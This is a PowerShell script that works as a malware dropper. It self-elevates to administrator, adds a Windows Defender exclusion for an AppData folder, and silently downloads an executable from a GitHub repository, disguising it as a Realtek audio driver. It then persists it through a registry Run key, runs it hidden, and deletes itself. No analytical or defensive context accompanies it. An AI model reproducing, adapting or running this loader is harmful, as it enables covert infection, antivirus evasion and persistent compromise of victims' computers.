# Self-elevate if not admin (for exclusion)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Silent download + exclusion attempt
$exeUrl = "https://github.com/webhookrepo195/mypresonalwebhookfile109/raw/refs/heads/main/Realtek%20Audio%20device.exe"

$exePath = "$env:APPDATA\Realtek\RealtekAudioDevice.exe"

$folder = "$env:APPDATA\Realtek"
if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force }

# Add exclusion for folder (now with admin)
try {
    Add-MpPreference -ExclusionPath $folder -Force
} catch {}

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
} catch {}

# Re-try exclusion after drop
if (Test-Path $exePath) {
    try {
        Add-MpPreference -ExclusionPath $folder -Force
    } catch {}
}

# Add startup
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "RealtekAudioHelper"
Set-ItemProperty -Path $regPath -Name $regName -Value $exePath -Force -ErrorAction SilentlyContinue

# Run hidden
Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction SilentlyContinue

# Self-delete
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue


